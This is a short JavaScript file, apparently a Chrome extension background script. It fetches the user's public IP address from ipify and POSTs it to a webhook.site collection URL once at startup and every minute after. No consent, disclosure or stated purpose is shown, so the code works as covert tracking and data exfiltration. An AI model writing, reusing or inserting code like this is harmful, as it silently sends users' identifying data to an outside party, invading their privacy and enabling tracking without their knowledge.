async function sendIP() {
  try {
    const ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
    await fetch('https://webhook.site/f9537565-e607-4630-ba2b-86ac0cda93e5', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip })
    });
  } catch (error) {
    console.error('Error:', error);
  }
}

chrome.alarms.create('ipAlarm', { periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener(() => sendIP());

sendIP();